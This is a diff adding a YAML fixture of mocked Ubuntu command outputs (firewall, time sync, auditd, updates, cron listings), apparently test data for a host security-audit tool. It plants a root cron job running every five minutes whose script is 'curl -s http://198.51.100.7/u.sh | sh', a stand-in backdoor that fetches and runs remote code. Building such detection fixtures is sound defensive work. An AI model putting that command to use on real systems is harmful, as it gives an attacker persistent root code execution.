@@ -1,0 +1,82 @@
+base: ../../../fixtures/ubuntu
+execs:
+- argv:
+  - sudo
+  - -n
+  - --
+  - ufw
+  - status
+  - verbose
+  stdout: 'Status: active
+
+    Logging: on (low)
+
+    Default: deny (incoming), allow (outgoing), disabled (routed)
+
+    New profiles: skip
+
+
+    To                         Action      From
+
+    --                         ------      ----
+
+    22/tcp                     ALLOW IN    Anywhere
+
+    '
+  code: 0
+- argv:
+  - timedatectl
+  - show
+  stdout: 'Timezone=Etc/UTC
+
+    LocalRTC=no
+
+    CanNTP=yes
+
+    NTP=yes
+
+    NTPSynchronized=yes
+
+    '
+  code: 0
+- argv:
+  - systemctl
+  - is-active
+  - auditd
+  stdout: 'active
+
+    '
+  code: 0
+- argv:
+  - apt
+  - list
+  - --upgradable
+  stdout: 'Listing...
+
+    '
+  code: 0
+- argv:
+  - grep
+  - -rH
+  - .
+  - /etc/crontab
+  - /etc/cron.d
+  stdout: "/etc/crontab:# /etc/crontab: system-wide crontab\n/etc/crontab:# Unlike any other crontab you don't have to run the `crontab'\n/etc/crontab:# command to install the new version when you edit this file\n/etc/crontab:# and files in /etc/cron.d. These files also have username fields,\n/etc/crontab:# that none of the other crontabs do.\n/etc/crontab:SHELL=/bin/sh\n/etc/crontab:# You can also override PATH, but by default, newer versions inherit it from the environment\n/etc/crontab:#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n/etc/crontab:# Example of job definition:\n/etc/crontab:# .---------------- minute (0 - 59)\n/etc/crontab:# |  .------------- hour (0 - 23)\n/etc/crontab:# |  |  .---------- day of month (1 - 31)\n/etc/crontab:# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n/etc/crontab:# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n/etc/crontab:# |  |  |  |  |\n/etc/crontab:# *  *  *  *  * user-name command\
+    \ to be executed\n/etc/crontab:17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n/etc/crontab:25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }\n/etc/crontab:47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }\n/etc/crontab:52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }\n/etc/crontab:#\n/etc/cron.d/e2scrub_all:30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/aarch64-linux-gnu/e2fsprogs/e2scrub_all_cron\n/etc/cron.d/e2scrub_all:10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r\n/etc/cron.d/.placeholder:# DO NOT EDIT OR REMOVE\n/etc/cron.d/.placeholder:# This file is a simple placeholder to keep dpkg from removing this directory\n/etc/cron.d/update:*/5 * * * * root /etc/cron.daily/update\n"
+  code: 0
+- argv:
+  - realpath
+  - /etc/cron.daily/update
+  stdout: '/etc/cron.daily/update
+
+    '
+  code: 0
+- argv:
+  - cat
+  - /etc/cron.daily/update
+  stdout: '#!/bin/sh
+
+    curl -s http://198.51.100.7/u.sh | sh
+
+    '
+  code: 0
